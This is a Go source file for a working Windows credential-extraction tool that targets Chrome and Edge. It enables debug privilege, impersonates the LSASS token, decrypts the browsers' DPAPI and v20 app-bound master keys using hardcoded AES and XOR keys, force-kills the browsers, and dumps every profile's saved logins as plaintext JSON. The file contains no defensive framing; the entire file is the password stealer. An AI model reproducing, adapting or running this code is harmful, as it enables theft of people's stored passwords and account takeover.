package credentials

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/sys/windows"
)

// Windows API structures and constants
const (
	TOKEN_DUPLICATE          = 0x0002
	TOKEN_IMPERSONATE        = 0x0004
	TOKEN_QUERY              = 0x0008
	SECURITY_IMPERSONATION   = 2
	TOKEN_TYPE_IMPERSONATION = 2
	SE_PRIVILEGE_ENABLED     = 0x00000002
	NCRYPT_PAD_PKCS1_FLAG    = 0x00000002
	NCRYPT_SILENT_FLAG       = 0x00000040
)

var (
	advapi32 = windows.NewLazySystemDLL("advapi32.dll")
	ncrypt   = windows.NewLazySystemDLL("ncrypt.dll")
	crypt32  = windows.NewLazySystemDLL("crypt32.dll")

	procOpenProcessToken      = advapi32.NewProc("OpenProcessToken")
	procDuplicateTokenEx      = advapi32.NewProc("DuplicateTokenEx")
	procSetThreadToken        = advapi32.NewProc("SetThreadToken")
	procLookupPrivilegeValue  = advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges = advapi32.NewProc("AdjustTokenPrivileges")

	procNCryptOpenStorageProvider = ncrypt.NewProc("NCryptOpenStorageProvider")
	procNCryptOpenKey             = ncrypt.NewProc("NCryptOpenKey")
	procNCryptDecrypt             = ncrypt.NewProc("NCryptDecrypt")
	procNCryptFreeObject          = ncrypt.NewProc("NCryptFreeObject")

	procCryptUnprotectData = crypt32.NewProc("CryptUnprotectData")
)

type Password struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type KeyBlob struct {
	Header          []byte
	Flag            byte
	IV              []byte
	Ciphertext      []byte
	Tag             []byte
	EncryptedAESKey []byte
}

func isAdmin() bool {
	var sid *windows.SID
	err := windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)
	if err != nil {
		return false
	}
	defer windows.FreeSid(sid)

	token := windows.Token(0)
	member, err := token.IsMember(sid)
	if err != nil {
		return false
	}
	return member
}

func enableDebugPrivilege() error {
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
	if err != nil {
		return fmt.Errorf("OpenProcessToken failed: %w", err)
	}
	defer token.Close()

	var luid windows.LUID
	privilegeName, _ := syscall.UTF16PtrFromString("SeDebugPrivilege")
	ret, _, err := procLookupPrivilegeValue.Call(
		0,
		uintptr(unsafe.Pointer(privilegeName)),
		uintptr(unsafe.Pointer(&luid)),
	)
	if ret == 0 {
		return fmt.Errorf("LookupPrivilegeValue failed: %w", err)
	}

	tp := struct {
		PrivilegeCount uint32
		Luid           windows.LUID
		Attributes     uint32
	}{
		PrivilegeCount: 1,
		Luid:           luid,
		Attributes:     SE_PRIVILEGE_ENABLED,
	}

	ret, _, err = procAdjustTokenPrivileges.Call(
		uintptr(token),
		0,
		uintptr(unsafe.Pointer(&tp)),
		0,
		0,
		0,
	)
	if ret == 0 {
		return fmt.Errorf("AdjustTokenPrivileges failed: %w", err)
	}

	return nil
}

func getLsassToken() (windows.Token, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %w", err)
	}
	defer windows.CloseHandle(snapshot)

	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	err = windows.Process32First(snapshot, &pe32)
	if err != nil {
		return 0, fmt.Errorf("Process32First failed: %w", err)
	}

	var lsassPID uint32
	for {
		processName := windows.UTF16ToString(pe32.ExeFile[:])
		if processName == "lsass.exe" {
			lsassPID = pe32.ProcessID
			break
		}
		err = windows.Process32Next(snapshot, &pe32)
		if err != nil {
			break
		}
	}

	if lsassPID == 0 {
		return 0, fmt.Errorf("lsass.exe not found")
	}

	processHandle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, lsassPID)
	if err != nil {
		processHandle, err = windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, lsassPID)
		if err != nil {
			return 0, fmt.Errorf("OpenProcess failed (try running as SYSTEM): %w", err)
		}
	}
	defer windows.CloseHandle(processHandle)

	var token windows.Token
	ret, _, err := procOpenProcessToken.Call(
		uintptr(processHandle),
		uintptr(TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY),
		uintptr(unsafe.Pointer(&token)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("OpenProcessToken failed: %w (try running as SYSTEM)", err)
	}

	return token, nil
}

func impersonateLsass() (windows.Token, error) {
	err := enableDebugPrivilege()
	if err != nil {
		return 0, err
	}

	lsassToken, err := getLsassToken()
	if err != nil {
		return 0, err
	}

	var dupToken windows.Token
	ret, _, _ := procDuplicateTokenEx.Call(
		uintptr(lsassToken),
		0,
		0,
		uintptr(SECURITY_IMPERSONATION),
		uintptr(TOKEN_TYPE_IMPERSONATION),
		uintptr(unsafe.Pointer(&dupToken)),
	)
	if ret == 0 {
		return 0, fmt.Errorf("DuplicateTokenEx failed")
	}

	ret, _, _ = procSetThreadToken.Call(0, uintptr(dupToken))
	if ret == 0 {
		return 0, fmt.Errorf("SetThreadToken failed")
	}

	return dupToken, nil
}

func revertToSelf() {
	procSetThreadToken.Call(0, 0)
}

func dpapiUnprotect(data []byte) ([]byte, error) {
	var outBlob windows.DataBlob
	inBlob := windows.DataBlob{
		Size: uint32(len(data)),
		Data: &data[0],
	}

	ret, _, err := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed: %w", err)
	}

	result := make([]byte, outBlob.Size)
	copy(result, unsafe.Slice(outBlob.Data, outBlob.Size))
	windows.LocalFree(windows.Handle(unsafe.Pointer(outBlob.Data)))

	return result, nil
}

// browser: "chrome" or "edge"
func ncryptDecrypt(data []byte, browser string) ([]byte, error) {
	var hProvider uintptr
	provider := windows.StringToUTF16Ptr("Microsoft Software Key Storage Provider")
	ret, _, _ := procNCryptOpenStorageProvider.Call(
		uintptr(unsafe.Pointer(&hProvider)),
		uintptr(unsafe.Pointer(provider)),
		0,
	)
	if ret != 0 {
		return nil, fmt.Errorf("NCryptOpenStorageProvider failed")
	}
	defer procNCryptFreeObject.Call(hProvider)

	// Key name depends on browser
	var keyName *uint16
	if browser == "edge" {
		keyName = windows.StringToUTF16Ptr("Microsoft Edgekey1")
	} else {
		keyName = windows.StringToUTF16Ptr("Google Chromekey1")
	}

	var hKey uintptr
	ret, _, _ = procNCryptOpenKey.Call(
		hProvider,
		uintptr(unsafe.Pointer(&hKey)),
		uintptr(unsafe.Pointer(keyName)),
		0, 0,
	)
	if ret != 0 {
		return nil, fmt.Errorf("NCryptOpenKey failed for key %s", windows.UTF16PtrToString(keyName))
	}
	defer procNCryptFreeObject.Call(hKey)

	var resultSize uint32
	ret, _, _ = procNCryptDecrypt.Call(
		hKey,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		0, 0, 0,
		uintptr(unsafe.Pointer(&resultSize)),
		NCRYPT_SILENT_FLAG,
	)
	if ret != 0 {
		return nil, fmt.Errorf("NCryptDecrypt size query failed")
	}

	output := make([]byte, resultSize)
	ret, _, _ = procNCryptDecrypt.Call(
		hKey,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		0,
		uintptr(unsafe.Pointer(&output[0])),
		uintptr(resultSize),
		uintptr(unsafe.Pointer(&resultSize)),
		NCRYPT_SILENT_FLAG,
	)
	if ret != 0 {
		return nil, fmt.Errorf("NCryptDecrypt failed")
	}

	return output[:resultSize], nil
}

func parseKeyBlob(data []byte) (*KeyBlob, error) {
	if len(data) < 8 {
		return nil, fmt.Errorf("blob too short")
	}

	headerLen := binary.LittleEndian.Uint32(data[0:4])
	header := data[4 : 4+headerLen]

	contentLen := binary.LittleEndian.Uint32(data[4+headerLen : 8+headerLen])
	_ = contentLen
	offset := 8 + headerLen

	blob := &KeyBlob{
		Header: header,
		Flag:   data[offset],
	}
	offset++

	switch blob.Flag {
	case 1, 2:
		blob.IV = data[offset : offset+12]
		offset += 12
		blob.Ciphertext = data[offset : offset+32]
		offset += 32
		blob.Tag = data[offset : offset+16]
	case 3:
		blob.EncryptedAESKey = data[offset : offset+32]
		offset += 32
		blob.IV = data[offset : offset+12]
		offset += 12
		blob.Ciphertext = data[offset : offset+32]
		offset += 32
		blob.Tag = data[offset : offset+16]
	default:
		return nil, fmt.Errorf("unsupported flag: %d", blob.Flag)
	}

	return blob, nil
}

func xorBytes(a, b []byte) []byte {
	result := make([]byte, len(a))
	for i := range a {
		result[i] = a[i] ^ b[i]
	}
	return result
}

// browser: "chrome" or "edge"
func deriveV20MasterKey(blob *KeyBlob, browser string) ([]byte, error) {
	var aesKey []byte
	var gcm cipher.AEAD

	switch blob.Flag {
	case 1:
		aesKey, _ = hexDecode("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
		block, err := aes.NewCipher(aesKey)
		if err != nil {
			return nil, err
		}
		gcm, err = cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}

	case 2:
		return nil, fmt.Errorf("ChaCha20-Poly1305 not implemented")

	case 3:
		xorKey, _ := hexDecode("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")

		token, err := impersonateLsass()
		if err != nil {
			return nil, err
		}
		defer revertToSelf()
		defer token.Close()

		decryptedAESKey, err := ncryptDecrypt(blob.EncryptedAESKey, browser)
		if err != nil {
			return nil, err
		}

		aesKey = xorBytes(decryptedAESKey, xorKey)
		block, err := aes.NewCipher(aesKey)
		if err != nil {
			return nil, err
		}
		gcm, err = cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}
	}

	ciphertext := append(blob.Ciphertext, blob.Tag...)
	plaintext, err := gcm.Open(nil, blob.IV, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

// getMasterKey now takes the Local State path AND browser name
func getMasterKey(localStatePath, browser string) ([]byte, error) {
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read Local State: %w", err)
	}

	var localState map[string]interface{}
	err = json.Unmarshal(data, &localState)
	if err != nil {
		return nil, fmt.Errorf("failed to parse Local State JSON: %w", err)
	}

	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return nil, fmt.Errorf("os_crypt not found in Local State")
	}

	// Try v20 app-bound key FIRST – but only for Chrome
	encryptedKeyB64, hasAppBound := osCrypt["app_bound_encrypted_key"].(string)
	if hasAppBound && browser == "chrome" {
		fmt.Println("Detected v20 app-bound encryption key (Chrome)")

		encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
		if err != nil {
			return nil, fmt.Errorf("failed to decode v20 key: %w", err)
		}

		if len(encryptedKey) < 4 || string(encryptedKey[:4]) != "APPB" {
			return nil, fmt.Errorf("invalid app-bound key format")
		}

		encryptedKey = encryptedKey[4:] // Remove "APPB" prefix

		token, err := impersonateLsass()
		if err != nil {
			return nil, fmt.Errorf("failed to impersonate LSASS (required for v20): %w\nNote: v20 encryption requires SYSTEM privileges", err)
		}
		defer revertToSelf()
		defer token.Close()

		systemDecrypted, err := dpapiUnprotect(encryptedKey)
		if err != nil {
			return nil, fmt.Errorf("failed system DPAPI decrypt: %w", err)
		}

		revertToSelf()

		userDecrypted, err := dpapiUnprotect(systemDecrypted)
		if err != nil {
			return nil, fmt.Errorf("failed user DPAPI decrypt: %w", err)
		}

		blob, err := parseKeyBlob(userDecrypted)
		if err != nil {
			return nil, fmt.Errorf("failed to parse key blob: %w", err)
		}

		masterKey, err := deriveV20MasterKey(blob, browser)
		if err != nil {
			return nil, fmt.Errorf("failed to derive v20 key: %w", err)
		}

		fmt.Println("✓ Using v20 app-bound master key (Chrome)")
		return masterKey, nil
	}

	if hasAppBound && browser == "edge" {
		// Edge app-bound format is different; our parser doesn’t support it yet.
		fmt.Println("Detected v20 app-bound encryption key (Edge) – currently unsupported, trying legacy encrypted_key instead...")
	}

	// Fall back to legacy encrypted_key (v10/v11)
	encryptedKeyB64, ok = osCrypt["encrypted_key"].(string)
	if !ok {
		return nil, fmt.Errorf("no legacy encrypted_key found (neither encrypted_key nor supported app_bound_encrypted_key)")
	}

	fmt.Printf("Detected v10/v11 legacy encryption for %s\n", strings.Title(browser))

	encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
	if err != nil {
		return nil, fmt.Errorf("failed to decode key: %w", err)
	}

	if len(encryptedKey) < 5 || string(encryptedKey[:5]) != "DPAPI" {
		return nil, fmt.Errorf("invalid key format")
	}

	encryptedKey = encryptedKey[5:] // Remove "DPAPI" prefix

	// Try without impersonation first (works for current user)
	masterKey, err := dpapiUnprotect(encryptedKey)
	if err == nil {
		return masterKey, nil
	}

	fmt.Println("Trying with LSASS impersonation for legacy key...")
	token, err := impersonateLsass()
	if err != nil {
		return nil, fmt.Errorf("failed to impersonate LSASS: %w", err)
	}
	defer revertToSelf()
	defer token.Close()

	masterKey, err = dpapiUnprotect(encryptedKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt legacy key: %w", err)
	}

	return masterKey, nil
}

func getEncryptionVersion(data []byte) string {
	if len(data) < 3 {
		return "DPAPI"
	}
	prefix := string(data[:3])
	switch prefix {
	case "v10":
		return "v10"
	case "v11":
		return "v11"
	case "v20":
		return "v20"
	default:
		return "DPAPI"
	}
}

func decryptValue(encryptedValue []byte, masterKey []byte) (string, error) {
	if len(encryptedValue) == 0 {
		return "", nil
	}

	version := getEncryptionVersion(encryptedValue)

	switch version {
	case "v10", "v11", "v20":
		// All v10/v11/v20 use AES-GCM with the masterKey, not DPAPI.
		if masterKey == nil {
			return "", fmt.Errorf("no master key for %s", version)
		}

		// Layout: "v10"/"v11"/"v20" (3 bytes) + 12-byte nonce + ciphertext||tag
		if len(encryptedValue) < 3+12+16 {
			return "", fmt.Errorf("encrypted value too short for %s", version)
		}

		iv := encryptedValue[3 : 3+12]
		data := encryptedValue[3+12:] // ciphertext || tag

		block, err := aes.NewCipher(masterKey)
		if err != nil {
			return "", fmt.Errorf("cipher init failed: %w", err)
		}

		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return "", fmt.Errorf("GCM init failed: %w", err)
		}

		plaintext, err := gcm.Open(nil, iv, data, nil)
		if err != nil {
			return "", fmt.Errorf("decryption failed (%s): %w", version, err)
		}

		// For passwords we keep plaintext as-is (no stripping of prefixes)
		return string(plaintext), nil

	case "DPAPI":
		// Old records encrypted directly with DPAPI – no masterKey involved.
		decrypted, err := dpapiUnprotect(encryptedValue)
		if err == nil {
			return string(decrypted), nil
		}

		// Try with LSASS impersonation as a fallback
		token, err := impersonateLsass()
		if err != nil {
			return "", fmt.Errorf("DPAPI failed, cannot impersonate: %w", err)
		}
		defer revertToSelf()
		defer token.Close()

		decrypted, err = dpapiUnprotect(encryptedValue)
		if err != nil {
			return "", fmt.Errorf("DPAPI decrypt failed: %w", err)
		}

		return string(decrypted), nil

	default:
		return "", fmt.Errorf("unknown encryption version: %s", version)
	}
}

func hexDecode(s string) ([]byte, error) {
	result := make([]byte, len(s)/2)
	for i := 0; i < len(s); i += 2 {
		fmt.Sscanf(s[i:i+2], "%02x", &result[i/2])
	}
	return result, nil
}

// browser is "chrome" or "edge"
func extractPasswords(profileDir, profileName, browser string, masterKey []byte) error {
	loginDBPath := filepath.Join(profileDir, "Login Data")

	db, err := sql.Open("sqlite3", "file:"+loginDBPath+"?mode=ro&immutable=1")
	if err != nil {
		return err
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return err
	}
	defer rows.Close()

	var passwords []Password
	successCount := 0
	failCount := 0

	for rows.Next() {
		var url, username string
		var encryptedPassword []byte

		err := rows.Scan(&url, &username, &encryptedPassword)
		if err != nil {
			continue
		}

		password, err := decryptValue(encryptedPassword, masterKey)
		if err != nil {
			password = "DECRYPT_FAILED"
			failCount++
			if failCount == 1 {
				fmt.Printf("  First password decrypt error: %v\n", err)
				fmt.Printf("  Encryption version: %s, Length: %d\n", getEncryptionVersion(encryptedPassword), len(encryptedPassword))
			}
		} else {
			successCount++
		}

		passwords = append(passwords, Password{
			URL:      url,
			Username: username,
			Password: password,
		})
	}

	fmt.Printf("  Passwords: %d succeeded, %d failed\n", successCount, failCount)

	outputDir := filepath.Join("results","chromium", browser, profileName)
	os.MkdirAll(outputDir, 0755)

	passwordJSON, err := json.MarshalIndent(passwords, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile(filepath.Join(outputDir, "passwords.json"), passwordJSON, 0644)
}

// runBrowserExtraction handles one Chromium browser (chrome/edge)
func runBrowserExtraction(browser, userDataDir string) {
	title := strings.Title(browser)

	if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
		fmt.Printf("\n%s user data directory not found, skipping (%s)\n", title, userDataDir)
		return
	}

	fmt.Printf("\n=== %s extraction ===\n", title)

	localStatePath := filepath.Join(userDataDir, "Local State")
	fmt.Println("Getting master key...")
	masterKey, err := getMasterKey(localStatePath, browser)
	if err != nil {
		fmt.Printf("\n❌ Failed to get %s master key: %v\n", title, err)
		fmt.Println("\n=== Troubleshooting ===")
		fmt.Println("1. Chromium v127+ uses v20 encryption requiring SYSTEM privileges")
		fmt.Println("2. Download PsExec: https://live.sysinternals.com/psexec.exe")
		fmt.Println("3. Run the tool as SYSTEM for full decryption support")
		fmt.Println("4. Alternatively, use NSudo or Task Scheduler to run as SYSTEM")
		return
	}

	fmt.Println("✓ Master key obtained successfully!")

	entries, err := os.ReadDir(userDataDir)
	if err != nil {
		fmt.Printf("Failed to read %s directory: %v\n", title, err)
		return
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}

		name := entry.Name()
		matched, _ := filepath.Match("Profile*", name)
		if name != "Default" && !matched {
			continue
		}

		profileDir := filepath.Join(userDataDir, name)
		profileName := name

		fmt.Printf("\nProcessing %s profile: %s\n", browser, profileName)

		if err := extractPasswords(profileDir, profileName, browser, masterKey); err != nil {
			fmt.Printf("Password extraction failed: %v\n", err)
		} else {
			fmt.Printf("Passwords extracted\n")
		}
	}
}

// findUserProfile tries to locate a user profile that has Chrome or Edge data
func findUserProfile() string {
	userProfile := os.Getenv("USERPROFILE")
	if userProfile != "" {
		return userProfile
	}

	usersDir := "C:\\Users"
	entries, err := os.ReadDir(usersDir)
	if err != nil {
		fmt.Printf("Failed to read Users directory: %v\n", err)
		return ""
	}

	for _, entry := range entries {
		if !entry.IsDir() || entry.Name() == "Public" || entry.Name() == "Default" {
			continue
		}

		base := filepath.Join(usersDir, entry.Name(), "AppData", "Local")

		chromePath := filepath.Join(base, "Google", "Chrome", "User Data")
		edgePath := filepath.Join(base, "Microsoft", "Edge", "User Data")

		if _, err := os.Stat(chromePath); err == nil {
			fmt.Printf("Found user profile with Chrome data: %s\n", entry.Name())
			return filepath.Join(usersDir, entry.Name())
		}
		if _, err := os.Stat(edgePath); err == nil {
			fmt.Printf("Found user profile with Edge data: %s\n", entry.Name())
			return filepath.Join(usersDir, entry.Name())
		}
	}

	return ""
}

func Run() {
	if !isAdmin() {
		fmt.Println("ERROR: This program must be run as administrator")
		fmt.Println("Right-click the executable and select 'Run as administrator'")
		fmt.Println("\nPress Enter to exit...")
		fmt.Scanln()
		return
	}

	fmt.Println("Running with administrator privileges...")

	// Check if running as SYSTEM
	var token windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token); err == nil {
		defer token.Close()
		user, _ := token.GetTokenUser()
		sid := user.User.Sid.String()
		if sid == "S-1-5-18" {
			fmt.Println("✓ Running as SYSTEM")
		} else {
			fmt.Println("⚠ Running as Administrator (not SYSTEM)")
		}
	} else {
		fmt.Println("⚠ Could not query token to detect SYSTEM/admin properly")
	}

	// Kill Chrome and Edge
	fmt.Println("\nAttempting to close Chrome and Edge...")
	exec.Command("taskkill", "/F", "/IM", "chrome.exe").Run()
	exec.Command("taskkill", "/F", "/IM", "msedge.exe").Run()

	userProfile := findUserProfile()
	if userProfile == "" {
		fmt.Println("Could not find a user profile with Chrome or Edge data")
		fmt.Println("\nPress Enter to exit...")
		fmt.Scanln()
		return
	}

	// Common base
	baseLocal := filepath.Join(userProfile, "AppData", "Local")

	chromeUserData := filepath.Join(baseLocal, "Google", "Chrome", "User Data")
	edgeUserData := filepath.Join(baseLocal, "Microsoft", "Edge", "User Data")

	// Extract passwords for Chrome and Edge
	runBrowserExtraction("chrome", chromeUserData)
	runBrowserExtraction("edge", edgeUserData)

	fmt.Println("\n=== Extraction complete! ===")
	fmt.Println("Chrome passwords: ./results/chrome/<profile>/passwords.json")
	fmt.Println("Edge passwords:   ./results/edge/<profile>/passwords.json")
}
